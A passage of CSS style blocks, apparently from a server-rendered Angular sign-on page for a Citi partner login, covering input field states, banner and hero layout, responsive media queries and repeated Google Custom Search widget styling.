
    .input-container.errored.focused[_ngcontent-ssr-c80] {
      width: calc(100% + 2px);
      border-width: 1.99px;
      margin: 2px 0 4px -1px
    }

    .input-container.success[_ngcontent-ssr-c80] {
      border-color: #006e0a
    }

    .input-container.success.focused[_ngcontent-ssr-c80] {
      width: calc(100% + 2px);
      border-width: 1.99px;
      margin: 2px 0 4px -1px
    }

    .input-container.readOnly[_ngcontent-ssr-c80] {
      background: #fff;
      border: 1px solid #666
    }

    .input-container.readOnly[_ngcontent-ssr-c80] input.readOnly[_ngcontent-ssr-c80]:-moz-read-only {
      background-color: #fff
    }

    .input-container.readOnly[_ngcontent-ssr-c80] input.readOnly[_ngcontent-ssr-c80]:read-only,
    .input-container.readOnly[_ngcontent-ssr-c80] select[_ngcontent-ssr-c80],
    .input-container.readOnly[_ngcontent-ssr-c80] span[_ngcontent-ssr-c80] {
      background-color: #fff
    }

    .input-container.disabled[_ngcontent-ssr-c80] {
      background: #fff;
      border: 1px solid #666
    }

    .input-container.disabled[_ngcontent-ssr-c80] input.disabled[_ngcontent-ssr-c80]:disabled,
    .input-container.disabled[_ngcontent-ssr-c80] select[_ngcontent-ssr-c80],
    .input-container.disabled[_ngcontent-ssr-c80] span[_ngcontent-ssr-c80] {
      background-color: #fff
    }

    .input-container.has-pre-addon[_ngcontent-ssr-c80] input[_ngcontent-ssr-c80] {
      padding-left: 0 !important
    }

    .input-container[_ngcontent-ssr-c80] .input-group-addon.before[_ngcontent-ssr-c80] {
      border-top-left-radius: 8px;
      border-bottom-left-radius: 8px
    }

    .input-container[_ngcontent-ssr-c80] .input-group-addon.after[_ngcontent-ssr-c80],
    .input-container[_ngcontent-ssr-c80] .input-group-addon.before[_ngcontent-ssr-c80] {
      width: 48px;
      height: 48px
    }

    .input-container[_ngcontent-ssr-c80] .input-group-addon.after[_ngcontent-ssr-c80] {
      border-top-right-radius: 8px;
      border-bottom-right-radius: 8px
    }

    .input-container[_ngcontent-ssr-c80] .add-on-pre[_ngcontent-ssr-c80] {
      order: 0;
      flex: 0 1 auto;
      -ms-grid-row-align: auto;
      align-self: auto;
      box-sizing: border-box;
      -moz-box-sizing: border-box
    }

    .input-container[_ngcontent-ssr-c80] .add-on-pre[_ngcontent-ssr-c80] select[_ngcontent-ssr-c80] {
      margin: 0;
      width: 105px;
      border: 1px solid transparent;
      border-top-right-radius: 0;
      border-bottom-right-radius: 0
    }

    .input-container[_ngcontent-ssr-c80] .add-on-pre[_ngcontent-ssr-c80] select[_ngcontent-ssr-c80]:focus {
      border-color: #056dae;
      outline: 0
    }

    .input-container[_ngcontent-ssr-c80] .input-switch-wrapper[_ngcontent-ssr-c80] {
      flex: 1 1 0%;
      box-sizing: border-box;
      -moz-box-sizing: border-box;
      margin: 0 2px;
      border-radius: 8px
    }

    .input-container[_ngcontent-ssr-c80] .input-switch-wrapper[_ngcontent-ssr-c80] input[_ngcontent-ssr-c80] {
      width: 100%;
      box-sizing: border-box;
      -moz-box-sizing: border-box;
      letter-spacing: .5px;
      height: 48px;
      padding: 10px 20px;
      background: #eee;
      border: none !important;
      box-shadow: none;
      border-radius: 8px
    }

    .input-container[_ngcontent-ssr-c80] .input-switch-wrapper[_ngcontent-ssr-c80] input[_ngcontent-ssr-c80]::-ms-clear {
      display: none
    }

    .input-container[_ngcontent-ssr-c80] .input-switch-wrapper[_ngcontent-ssr-c80] input[_ngcontent-ssr-c80]:focus {
      outline: 0
    }

    .input-container[_ngcontent-ssr-c80] .add-on-post[_ngcontent-ssr-c80] {
      flex: 0 1 auto;
      box-sizing: border-box;
      -moz-box-sizing: border-box
    }

    .input-container[_ngcontent-ssr-c80] .add-on-post[_ngcontent-ssr-c80] .search[_ngcontent-ssr-c80] {
      width: 50px;
      padding-top: 12px;
      border-radius: 8px
    }

    .input-container[_ngcontent-ssr-c80] .add-on-post[_ngcontent-ssr-c80] .showHideMask[_ngcontent-ssr-c80] {
      width: 50px;
      border-radius: 8px;
      padding: 17px 20px 17px 10px;
      color: #056dae;
      font-family: Interstate_Bold, sans-serif;
      line-height: 14px;
      cursor: pointer;
      font-size: 12px
    }

    .input-error[_ngcontent-ssr-c80],
    .input-success[_ngcontent-ssr-c80] {
      height: 16px;
      width: 100%;
      float: left
    }

    .input-success[_ngcontent-ssr-c80] .validation-message-success[_ngcontent-ssr-c80] {
      font-family: Interstate_Bold, sans-serif;
      margin: 0;
      color: #006e0a;
      font-weight: 700;
      position: relative;
      display: block;
      line-height: 1rem;
      font-size: .75rem
    }

    [_nghost-ssr-c80] .light[_ngcontent-ssr-c80] .input-container[_ngcontent-ssr-c80] {
      background: #fff
    }

    [_nghost-ssr-c80] .light[_ngcontent-ssr-c80] .input-container[_ngcontent-ssr-c80] input[_ngcontent-ssr-c80],
    [_nghost-ssr-c80] .light[_ngcontent-ssr-c80] .input-container[_ngcontent-ssr-c80] select[_ngcontent-ssr-c80],
    [_nghost-ssr-c80] .light[_ngcontent-ssr-c80] .input-container[_ngcontent-ssr-c80] span[_ngcontent-ssr-c80] {
      background-color: #fff
    }

    [_nghost-ssr-c80] .light[_ngcontent-ssr-c80] .input-container.readOnly[_ngcontent-ssr-c80] {
      background: #eee
    }

    [_nghost-ssr-c80] .light[_ngcontent-ssr-c80] .input-container.readOnly[_ngcontent-ssr-c80] input[_ngcontent-ssr-c80],
    [_nghost-ssr-c80] .light[_ngcontent-ssr-c80] .input-container.readOnly[_ngcontent-ssr-c80] select[_ngcontent-ssr-c80],
    [_nghost-ssr-c80] .light[_ngcontent-ssr-c80] .input-container.readOnly[_ngcontent-ssr-c80] span[_ngcontent-ssr-c80] {
      background-color: #eee
    }

    #inputSearchIconId path {
      fill: #056dae
    }

    [_ngcontent-ssr-c80]::-webkit-input-placeholder {
      color: #6b6b6b
    }

    [_ngcontent-ssr-c80]::-moz-placeholder {
      color: #6b6b6b
    }

    [_ngcontent-ssr-c80]:-ms-input-placeholder {
      color: #6b6b6b
    }

    [_ngcontent-ssr-c80]:-moz-placeholder {
      color: #6b6b6b
    }
  </style>
  <style>
    [_nghost-ssr-c72] {
      display: block
    }

    .validation-input-danger[_ngcontent-ssr-c72] {
      border-color: #d60000
    }

    .input-group-btn[_ngcontent-ssr-c72] {
      vertical-align: top
    }

    .input-addon-border[_ngcontent-ssr-c72] {
      border-left-color: #eee !important
    }

    .margin-fix[_ngcontent-ssr-c72] {
      margin: 0 !important
    }

    .input-fix[_ngcontent-ssr-c72] {
      border: 1px solid #fff !important;
      transition: border-color 225ms ease-in-out
    }

    .border-focused-addon[_ngcontent-ssr-c72] {
      border: 1px solid #056dae !important;
      border-radius: 7px
    }

    .border-error-addon[_ngcontent-ssr-c72] {
      border: 1px solid #d60000 !important;
      border-radius: 10px 7px 7px
    }

    .border-focused-addon.border-error-addon[_ngcontent-ssr-c72] {
      border-width: 2px !important
    }

    .containsAddon[_ngcontent-ssr-c72] {
      outline-color: #056dae !important;
      border: none !important;
      border-right: 0 !important
    }

    .theme-dark[_ngcontent-ssr-c72] {
      background-color: #eee !important
    }

    select.theme-dark[_ngcontent-ssr-c72]::-ms-value {
      background-color: #eee
    }

    select.theme-dark[_ngcontent-ssr-c72]:focus::-ms-value {
      background-color: #eee
    }

    .theme-light[_ngcontent-ssr-c72] {
      background-color: #fff !important
    }

    select[_ngcontent-ssr-c72]:focus {
      border: 1px solid #056dae !important
    }

    select.theme-light[_ngcontent-ssr-c72]::-ms-value {
      background-color: #fff
    }

    select.theme-light[_ngcontent-ssr-c72]:focus::-ms-value {
      background-color: #fff
    }

    .input-group-addon.before[_ngcontent-ssr-c72] {
      border-radius: 5px 0 0 5px !important
    }

    .input-group-addon.after[_ngcontent-ssr-c72] {
      border-radius: 0 5px 5px 0 !important
    }

    label[_ngcontent-ssr-c72] {
      opacity: 0
    }

    .has-value[_ngcontent-ssr-c72] label[_ngcontent-ssr-c72],
    .is-focused[_ngcontent-ssr-c72] label[_ngcontent-ssr-c72] {
      opacity: 1
    }
  </style>
  <style>
    .preLoadJamp[_ngcontent-ssr-c204] {
      background: #fff
    }

    body {
      overflow-x: hidden !important
    }

    div .citi-container {
      max-width: 100% !important;
      padding: 0 !important;
      min-height: 400px !important
    }

    div.citi-container.cbolui-ddl.theme-light {
      padding-top: 0 !important
    }

    .partner-login-frgot-link[_ngcontent-ssr-c204] {
      display: block;
      margin: 10px 0
    }

    citi-jamp.jamp-page-level[_ngcontent-ssr-c204] {
      z-index: 99999
    }

    div.disclaimer .content .text p {
      font-size: 12px;
      color: #fff
    }

    .welcomeBarCitigold div.welcome {
      background: #163c6a !important
    }

    .welcomeBarCpc div.welcome {
      background: #281814 !important
    }

    .welcome {
      max-width: 100% !important;
      margin: 0 !important;
      padding: 10px 0 !important
    }

    .welcome .content {
      display: none !important
    }

    .welcome .logo {
      width: 1440px !important;
      margin: 0 auto !important;
      position: relative;
      padding: 0 20px !important
    }

    .partner-login-banner[_ngcontent-ssr-c204] {
      height: 50px;
      background: #163c6a 100%;
      margin: 0 -20px;
      padding: 0;
      border: 0;
      vertical-align: baseline
    }

    .partner-login-banner[_ngcontent-ssr-c204] .content-wrap[_ngcontent-ssr-c204] {
      max-width: 1440px;
      height: 100%;
      margin: 0 auto;
      padding: 0 20px;
      position: relative
    }

    .partner-login-banner[_ngcontent-ssr-c204] .content-wrap[_ngcontent-ssr-c204] .logo[_ngcontent-ssr-c204] {
      display: inline-flex;
      flex-direction: row;
      flex-wrap: nowrap;
      justify-content: flex-start;
      align-content: center;
      align-items: center;
      height: 100%;
      line-height: 100%
    }

    .partner-login-banner[_ngcontent-ssr-c204] .content-wrap[_ngcontent-ssr-c204] .logo[_ngcontent-ssr-c204] img[_ngcontent-ssr-c204] {
      vertical-align: middle
    }

    .partner-login-container-hero[_ngcontent-ssr-c204] {
      width: 100vw
    }

    .partner-login-hero-logo[_ngcontent-ssr-c204] {
      -o-object-fit: cover;
      object-fit: cover;
      width: 100%;
      max-height: 400px
    }

    .partner-login-hero-logo-cpc[_ngcontent-ssr-c204],
    .partner-login-hero-logo-pcd[_ngcontent-ssr-c204] {
      width: 100%
    }

    .partner-login-container-fluid[_ngcontent-ssr-c204] {
      width: -webkit-fit-content;
      width: -moz-fit-content;
      width: fit-content;
      position: absolute;
      height: 44%
    }

    .partner-login-content-header[_ngcontent-ssr-c204] {
      margin-bottom: 20px !important;
      font-size: 24px;
      line-height: 20px;
      color: #333
    }

    .partner-login-content-header-cpc[_ngcontent-ssr-c204] {
      width: 80%;
      font-size: 42px;
      color: #281814;
      letter-spacing: -1px;
      line-height: 50px
    }

    .partner-login-input-fluid[_ngcontent-ssr-c204] {
      width: 454px;
      position: relative;
      min-height: 1px
    }

    .partner-login-input-fluid-ngadeepdrop[_ngcontent-ssr-c204] {
      width: 500px;
      position: relative;
      min-height: 1px
    }

    @media only screen and (min-width:1200px) {
      .partnerLoginBox[_ngcontent-ssr-c204] {
        position: absolute;
        background-color: #fff;
        padding: 20px;
        top: 0;
        right: 2%;
        bottom: 0;
        margin-top: 10px;
        margin-bottom: 20px
      }
    }

    @media only screen and (min-width:992px) {
      .partnerLoginBox[_ngcontent-ssr-c204] {
        position: absolute;
        background-color: #fff;
        padding: 20px;
        top: 0;
        right: 2%;
        bottom: 0;
        margin-top: 10px;
        margin-bottom: 20px
      }

      .partner-login-content-fluid[_ngcontent-ssr-c204] {
        width: 344px;
        background: #fff
      }
    }

    @media only screen and (min-width:1024px) and (max-width:1400px) {
      .partnerLoginBox[_ngcontent-ssr-c204] {
        position: absolute;
        background-color: #fff;
        padding: 20px;
        top: 0;
        right: 2%;
        bottom: 0;
        margin-top: 10px;
        margin-bottom: 20px
      }
    }

    @media only screen and (max-width:767px) {
      .banner-description {
        top: 0;
        padding: 20px;
        background-color: rgba(5, 109, 173, .95) !important;
        width: 100%;
        position: absolute;
        color: #fff;
        height: 350px
      }
    }

    @media only screen and (min-width:991px) {
      .partnerLoginBox[_ngcontent-ssr-c204] {
        position: absolute;
        background-color: #fff;
        padding: 20px;
        top: 0;
        right: 2%;
        bottom: 0;
        margin-top: 10px;
        margin-bottom: 20px
      }

      .banner-description {
        top: 0;
        padding: 65px 2.1% 20px;
        background-color: rgba(5, 109, 173, .95) !important;
        width: 42.8%;
        position: absolute;
        color: #fff;
        height: 400px
      }

      .login-screen-logo[_ngcontent-ssr-c204] {
        -o-object-fit: cover;
        object-fit: cover;
        background-size: cover;
        background-position: 50%;
        display: block;
        width: 100%;
        min-height: 400px
      }
    }

    .bottomBanner[_ngcontent-ssr-c204] .glyphicon {
      display: none !important
    }

    @media only screen and (min-width:768px) and (max-width:990px) {
      .banner-description {
        top: 0;
        background-color: rgba(5, 109, 173, .95) !important;
        width: 48.7%;
        position: absolute;
        color: #fff;
        text-align: center;
        bottom: inherit;
        padding: 1.5% 1% 3% 2.8%;
        min-height: 187px
      }

      .login-screen-logo[_ngcontent-ssr-c204] {
        -o-object-fit: cover;
        object-fit: cover;
        background-size: cover;
        background-position: 50%;
        display: block;
        width: 100%;
        min-height: 400px
      }

      .partner-login-content-fluid[_ngcontent-ssr-c204] {
        padding: 20px;
        background: #fff
      }

      .partner-login-hero-logo {
        -o-object-fit: cover;
        object-fit: cover;
        height: 400px
      }
    }

    @media only screen and (max-width:991px) {
      .partner-login-hero-logo {
        -o-object-fit: cover;
        object-fit: cover;
        height: 180px
      }

      .isDualLoginContainerImg[_ngcontent-ssr-c204],
      .login-screen-logo[_ngcontent-ssr-c204] {
        -o-object-fit: cover;
        object-fit: cover;
        background-size: cover;
        background-position: 50%;
        display: block;
        width: 100%;
        min-height: 340px
      }
    }

    .banner-description h4 {
      font-size: .75rem;
      letter-spacing: 1.5px;
      line-height: 1.125rem
    }

    .isDualLoginContainerImg[_ngcontent-ssr-c204],
    .login-screen-hero {
      position: relative
    }

    .banner-description h2 {
      font-size: 1.625rem;
      line-height: 2.11rem;
      color: #fff
    }

    .banner-description p {
      font-size: 1rem;
      line-height: 1.5rem;
      font-family: Interstate_Light, sans-serif, Arial
    }

    .partner-login-content-fluid[_ngcontent-ssr-c204] h2[_ngcontent-ssr-c204] {
      margin-bottom: 15px !important
    }

    .partner-login-content-paragraph[_ngcontent-ssr-c204] {
      width: 78% !important
    }

    citi-section.pcd_section_note[_ngcontent-ssr-c204] [_ngcontent-ssr-c204]:first-child,
    citi-section.pcd_section_note[_ngcontent-ssr-c204] [_ngcontent-ssr-c204]:nth-child(2) {
      margin-left: 25px
    }

    .login-screen-hero[_ngcontent-ssr-c204] .sfi {
      display: none
    }

    @media only screen and (max-width:990px) {
      div.sub-navigation div.content {
        border-bottom: none !important
      }
    }

    @media only screen and (min-width:991px) {
      div.content.singleBorder {
        padding: 0 !important;
        height: 1px !important
      }

      div.citi-container {
        padding: 40px 20px 0;
        min-height: 400px
      }

      .partner-login-hero-logo {
        -o-object-fit: cover;
        object-fit: cover;
        height: 400px
      }
    }

    @media screen and (min-width:768px) and (max-width:991px) {
      .partner-login-banner[_ngcontent-ssr-c204] .content-wrap[_ngcontent-ssr-c204] {
        padding: 0 12px
      }

      .isDualLoginContainer[_ngcontent-ssr-c204] {
        width: 100% !important
      }

      .isDualLoginContainerImg[_ngcontent-ssr-c204] {
        min-height: 340px !important
      }

      .username-input,
      div.password-input {
        width: 50% !important
      }

      div.citi-container {
        padding: 40px 20px 0
      }

      .partner-login-content-header[_ngcontent-ssr-c204],
      .partner-login-content-header-cpc[_ngcontent-ssr-c204] {
        line-height: 2rem;
        font-size: 1.625rem
      }
    }

    @media screen and (max-width:767px) {
      .welcome .logo {
        padding: 0 12px !important
      }

      div.password-input,
      div.username-input {
        width: 100% !important
      }

      .partner-login-banner[_ngcontent-ssr-c204] .content-wrap[_ngcontent-ssr-c204] {
        padding: 0 12px
      }

      .partner-login-content-fluid[_ngcontent-ssr-c204] {
        padding: 20px !important;
        margin: auto
      }

      .partner-login-content-header[_ngcontent-ssr-c204],
      .partner-login-content-header-cpc[_ngcontent-ssr-c204] {
        line-height: 2rem;
        width: 100%
      }

      .partner-login-back-link[_ngcontent-ssr-c204],
      .partner-login-back-link[_ngcontent-ssr-c204] button {
        display: block;
        margin: auto
      }

      div.sub-navigation div.content {
        border-bottom: none !important
      }

      .partner-login-hero-logo-cpc[_ngcontent-ssr-c204] {
        -o-object-position: 20% 100%;
        object-position: 20% 100%
      }

      .partner-login-hero-logo-cpc[_ngcontent-ssr-c204],
      .partner-login-hero-logo-pcd[_ngcontent-ssr-c204] {
        width: 100%;
        height: 170px;
        -o-object-fit: cover;
        object-fit: cover
      }

      .partner-login-hero-logo-pcd[_ngcontent-ssr-c204] {
        -o-object-position: 84% 20%;
        object-position: 84% 20%
      }
    }

    a[_ngcontent-ssr-c204] {
      overflow-wrap: break-word !important;
      white-space: pre-line !important;
      text-align: left !important;
      font-size: 12px !important;
      margin-right: 0 !important;
      vertical-align: top
    }

    [_nghost-ssr-c204] citi-input2 .form-control-container {
      padding-left: 10px !important;
      padding-right: 10px !important
    }

    .citi-signon2[_ngcontent-ssr-c204] a[_ngcontent-ssr-c204],
    .citi-signon2[_ngcontent-ssr-c204] a[_ngcontent-ssr-c204]:hover {
      font-size: 12px;
      line-height: 1px;
      text-decoration: underline;
      color: #056dae
    }

    .signonContainer[_ngcontent-ssr-c204] {
      padding-left: 0;
      padding-right: 0;
      margin: 0 !important
    }

    .cbolui-ddl-post[_ngcontent-ssr-c204] .theme-light[_ngcontent-ssr-c204] {
      background: #fff;
      padding: 20px 10px
    }

    #forgotUIdLink[_ngcontent-ssr-c204] .btn {
      width: 30%
    }

    #activateaCardLink[_ngcontent-ssr-c204] {
      padding-right: 10px
    }

    #registerOnlineLink[_ngcontent-ssr-c204] .btn {
      width: 50%;
      padding-left: 30px
    }

    .bottomBanner[_ngcontent-ssr-c204] .ct-banner-alert-box,
    .topBanner[_ngcontent-ssr-c204] .ct-banner-alert-box {
      margin: 0 !important
    }

    .bottomBanner[_ngcontent-ssr-c204] .full-content-body,
    .topBanner[_ngcontent-ssr-c204] .full-content-body {
      padding: 0 !important
    }

    .bottomBanner[_ngcontent-ssr-c204] .container-fluid,
    .topBanner[_ngcontent-ssr-c204] .container-fluid {
      max-width: none
    }

    .partnerLoginErrMsg[_ngcontent-ssr-c204] .critical {
      padding: 0;
      margin: 0
    }

    .dropdown2-wrapper {
      margin-left: 0 !important
    }

    .checkbox {
      min-width: 180px
    }

    .linkBlock[_ngcontent-ssr-c204] .btn-link {
      font-size: 12px;
      text-decoration: underline
    }

    .btn-primary {
      margin: 0 !important
    }

    .partner-login-container[_ngcontent-ssr-c204] {
      position: relative
    }

    .partnerLoginErrMsg {
      font-weight: 700;
      position: relative;
      line-height: 1rem;
      font-size: .75rem
    }

    .partnerLoginErrMsg[_ngcontent-ssr-c204] .alert.critical:before {
      top: 0
    }

    .isDualLogin[_ngcontent-ssr-c204] h4,
    .loginFail[_ngcontent-ssr-c204] h4 {
      display: none
    }

    .isDualLoginContainer[_ngcontent-ssr-c204] {
      width: 449px
    }

    .isDualLoginContainerImg[_ngcontent-ssr-c204] {
      min-height: 534px
    }

    @media (max-width:479px) {
      .isDualLoginContainerImg[_ngcontent-ssr-c204] {
        height: 0 !important;
        min-height: 0
      }

      .isDualLoginContainer[_ngcontent-ssr-c204] {
        width: 100%
      }
    }

    .margin-center[_ngcontent-ssr-c204] {
      margin-left: 50%;
      margin-bottom: 10px;
      margin-top: 35px
    }

    .banner-description[_ngcontent-ssr-c204] a {
      color: #fff;
      font-weight: 700
    }

    .mobileCode[_ngcontent-ssr-c204] {
      margin-bottom: 0 !important
    }

    #returnToPartner[_ngcontent-ssr-c204] {
      margin-left: 10px !important
    }
  </style>

  <style>
    [_nghost-ssr-c84] {
      display: block
    }

    a[_ngcontent-ssr-c84] {
      overflow-wrap: break-word !important;
      white-space: pre-line !important;
      text-align: left !important;
      font-size: 12px !important;
      margin-right: 0 !important;
      vertical-align: top
    }

    [_nghost-ssr-c84] .input-error {
      height: auto
    }

    .qr[_ngcontent-ssr-c84] {
      float: right;
      position: relative
    }
  </style>
  <style>
    [_nghost-ssr-c69] {
      display: block
    }

    .form-white-bg[_ngcontent-ssr-c69] {
      background-color: #fff !important
    }

    .form-group[_ngcontent-ssr-c69] {
      display: block
    }

    .dark[_ngcontent-ssr-c69] {
      background-color: #eee !important
    }

    select.dark[_ngcontent-ssr-c69]::-ms-value,
    select.dark[_ngcontent-ssr-c69]:focus::-ms-value {
      background-color: #eee
    }

    .light[_ngcontent-ssr-c69] {
      background-color: #fff !important
    }

    select.light[_ngcontent-ssr-c69]::-ms-value,
    select.light[_ngcontent-ssr-c69]:focus::-ms-value {
      background-color: #fff
    }

    .select-box-label[_ngcontent-ssr-c69] {
      opacity: 0
    }

    .has-value[_ngcontent-ssr-c69] .select-box-label[_ngcontent-ssr-c69],
    .is-focused[_ngcontent-ssr-c69] .select-box-label[_ngcontent-ssr-c69] {
      opacity: 1
    }

    .disabled-label[_ngcontent-ssr-c69] {
      color: #333;
      font-size: 12px;
      line-height: 1.5;
      font-family: Interstate-Light
    }

    .disabled-select[_ngcontent-ssr-c69] {
      color: #333;
      font-size: 16px;
      font-family: Interstate-Light;
      line-height: 1.5;
      border-width: 1px;
      border-style: solid;
      border-color: #666 !important;
      background-color: transparent !important;
      background-image: url("data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8' standalone='no'%3F%3E%3Csvg width='15px' height='8px' viewBox='0 0 15 8' version='1.1' xmlns='http://www.w3.org/2000/svg'%3E%3Cg transform='translate(-878, -122)' fill='%23666'%3E%3Cg transform='translate(570, 101)'%3E%3Cpath d='M312,32 L312,29.6917048 L316.989689,25.0246591 L312,20.3577556 L312,18 L318.461538,24.1555486 L318.461538,25.8443093 L312,32' transform='translate(315.230769, 25) rotate(-270) translate(-315.230769, -25) '%3E%3C/path%3E%3C/g%3E%3C/g%3E%3C/svg%3E")
    }

    .disabled-select[_ngcontent-ssr-c69]:focus {
      border-width: 1px;
      border-style: solid;
      border-color: #666 !important
    }
  </style>

  <style type="text/css">
    .gsc-control-cse {
      font-family: arial, sans-serif
    }

    .gsc-control-cse .gsc-table-result {
      font-family: arial, sans-serif
    }

    .gsc-refinementsGradient {
      background: linear-gradient(to left, rgba(255, 255, 255, 1), rgba(255, 255, 255, 0))
    }

    .gsc-control-cse {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    input.gsc-input,
    .gsc-input-box,
    .gsc-input-box-hover,
    .gsc-input-box-focus {
      border-color: #D9D9D9
    }

    .gsc-search-button-v2,
    .gsc-search-button-v2:hover,
    .gsc-search-button-v2:focus {
      border-color: #2F5BB7;
      background-color: #357AE8;
      background-image: none;
      filter: none
    }

    .gsc-search-button-v2 svg {
      fill: #FFFFFF
    }

    .gsc-tabHeader.gsc-tabhActive,
    .gsc-refinementHeader.gsc-refinementhActive {
      color: #CCCCCC;
      border-color: #CCCCCC;
      background-color: #FFFFFF
    }

    .gsc-tabHeader.gsc-tabhInactive,
    .gsc-refinementHeader.gsc-refinementhInactive {
      color: #CCCCCC;
      border-color: #CCCCCC;
      background-color: #FFFFFF
    }

    .gsc-webResult.gsc-result,
    .gsc-results .gsc-imageResult {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    .gsc-webResult.gsc-result:hover {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    .gs-webResult.gs-result a.gs-title:link,
    .gs-webResult.gs-result a.gs-title:link b,
    .gs-imageResult a.gs-title:link,
    .gs-imageResult a.gs-title:link b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:visited,
    .gs-webResult.gs-result a.gs-title:visited b,
    .gs-imageResult a.gs-title:visited,
    .gs-imageResult a.gs-title:visited b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:hover,
    .gs-webResult.gs-result a.gs-title:hover b,
    .gs-imageResult a.gs-title:hover,
    .gs-imageResult a.gs-title:hover b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:active,
    .gs-webResult.gs-result a.gs-title:active b,
    .gs-imageResult a.gs-title:active,
    .gs-imageResult a.gs-title:active b {
      color: #1155CC
    }

    .gsc-cursor-page {
      color: #1155CC
    }

    a.gsc-trailing-more-results:link {
      color: #1155CC
    }

    .gs-webResult:not(.gs-no-results-result):not(.gs-error-result) .gs-snippet,
    .gs-fileFormatType {
      color: #333333
    }

    .gs-webResult div.gs-visibleUrl {
      color: #009933
    }

    .gs-webResult div.gs-visibleUrl-short {
      color: #009933
    }

    .gs-promotion div.gs-visibleUrl-short {
      display: block
    }

    .gs-promotion div.gs-visibleUrl-long {
      display: none
    }

    .gs-promotion div.gs-visibleUrl-breadcrumb {
      display: none
    }

    .gsc-cursor-box {
      border-color: #FFFFFF
    }

    .gsc-results .gsc-cursor-box .gsc-cursor-page {
      border-color: #CCCCCC;
      background-color: #FFFFFF;
      color: #CCCCCC
    }

    .gsc-results .gsc-cursor-box .gsc-cursor-current-page {
      border-color: #CCCCCC;
      background-color: #FFFFFF;
      color: #CCCCCC
    }

    .gsc-webResult.gsc-result.gsc-promotion {
      border-color: #F6F6F6;
      background-color: #F6F6F6
    }

    .gsc-completion-title {
      color: #1155CC
    }

    .gsc-completion-snippet {
      color: #333333
    }

    .gs-promotion a.gs-title:link,
    .gs-promotion a.gs-title:link *,
    .gs-promotion .gs-snippet a:link {
      color: #1155CC
    }

    .gs-promotion a.gs-title:visited,
    .gs-promotion a.gs-title:visited *,
    .gs-promotion .gs-snippet a:visited {
      color: #1155CC
    }

    .gs-promotion a.gs-title:hover,
    .gs-promotion a.gs-title:hover *,
    .gs-promotion .gs-snippet a:hover {
      color: #1155CC
    }

    .gs-promotion a.gs-title:active,
    .gs-promotion a.gs-title:active *,
    .gs-promotion .gs-snippet a:active {
      color: #1155CC
    }

    .gs-promotion .gs-snippet,
    .gs-promotion .gs-title .gs-promotion-title-right,
    .gs-promotion .gs-title .gs-promotion-title-right * {
      color: #333333
    }

    .gs-promotion .gs-visibleUrl,
    .gs-promotion .gs-visibleUrl-short {
      color: #009933
    }

    .gcsc-find-more-on-google {
      color: #1155CC
    }

    .gcsc-find-more-on-google-magnifier {
      fill: #1155CC
    }
  </style>
  <style type="text/css">
    .gsc-control-cse {
      font-family: arial, sans-serif
    }

    .gsc-control-cse .gsc-table-result {
      font-family: arial, sans-serif
    }

    .gsc-refinementsGradient {
      background: linear-gradient(to left, rgba(255, 255, 255, 1), rgba(255, 255, 255, 0))
    }

    .gsc-control-cse {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    input.gsc-input,
    .gsc-input-box,
    .gsc-input-box-hover,
    .gsc-input-box-focus {
      border-color: #D9D9D9
    }

    .gsc-search-button-v2,
    .gsc-search-button-v2:hover,
    .gsc-search-button-v2:focus {
      border-color: #2F5BB7;
      background-color: #357AE8;
      background-image: none;
      filter: none
    }

    .gsc-search-button-v2 svg {
      fill: #FFFFFF
    }

    .gsc-tabHeader.gsc-tabhActive,
    .gsc-refinementHeader.gsc-refinementhActive {
      color: #CCCCCC;
      border-color: #CCCCCC;
      background-color: #FFFFFF
    }

    .gsc-tabHeader.gsc-tabhInactive,
    .gsc-refinementHeader.gsc-refinementhInactive {
      color: #CCCCCC;
      border-color: #CCCCCC;
      background-color: #FFFFFF
    }

    .gsc-webResult.gsc-result,
    .gsc-results .gsc-imageResult {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    .gsc-webResult.gsc-result:hover {
      border-color: #FFFFFF;
      background-color: #FFFFFF
    }

    .gs-webResult.gs-result a.gs-title:link,
    .gs-webResult.gs-result a.gs-title:link b,
    .gs-imageResult a.gs-title:link,
    .gs-imageResult a.gs-title:link b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:visited,
    .gs-webResult.gs-result a.gs-title:visited b,
    .gs-imageResult a.gs-title:visited,
    .gs-imageResult a.gs-title:visited b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:hover,
    .gs-webResult.gs-result a.gs-title:hover b,
    .gs-imageResult a.gs-title:hover,
    .gs-imageResult a.gs-title:hover b {
      color: #1155CC
    }

    .gs-webResult.gs-result a.gs-title:active,
    .gs-webResult.gs-result a.gs-title:active b,
    .gs-imageResult a.gs-title:active,
    .gs-imageResult a.gs-title:active b {
      color: #1155CC
    }

    .gsc-cursor-page {
      color: #1155CC
    }

    a.gsc-trailing-more-results:link {
      color: #1155CC
    }

    .gs-webResult:not(.gs-no-results-result):not(.gs-error-result) .gs-snippet,
    .gs-fileFormatType {
      color: #333333
    }

    .gs-webResult div.gs-visibleUrl {
      color: #009933
    }

    .gs-webResult div.gs-visibleUrl-short {
      color: #009933
    }

    .gs-promotion div.gs-visibleUrl-short {
      display: block
    }

    .gs-promotion div.gs-visibleUrl-long {
      display: none
    }

    .gs-promotion div.gs-visibleUrl-breadcrumb {
      display: none
    }

    .gsc-cursor-box {
      border-color: #FFFFFF
    }

    .gsc-results .gsc-cursor-box .gsc-cursor-page {
      border-color: #CCCCCC;
      background-color: #FFFFFF;
      color: #CCCCCC
    }

    .gsc-results .gsc-cursor-box .gsc-cursor-current-page {
      border-color: #CCCCCC;
      background-color: #FFFFFF;
      color: #CCCCCC
    }

    .gsc-webResult.gsc-result.gsc-promotion {
      border-color: #F6F6F6;
      background-color: #F6F6F6
    }

    .gsc-completion-title {
      color: #1155CC
    }

    .gsc-completion-snippet {
      color: #333333
    }

    .gs-promotion a.gs-title:link,
    .gs-promotion a.gs-title:link *,
    .gs-promotion .gs-snippet a:link {
      color: #1155CC
    }

    .gs-promotion a.gs-title:visited,
    .gs-promotion a.gs-title:visited *,
    .gs-promotion .gs-snippet a:visited {
      color: #1155CC
    }

    .gs-promotion a.gs-title:hover,
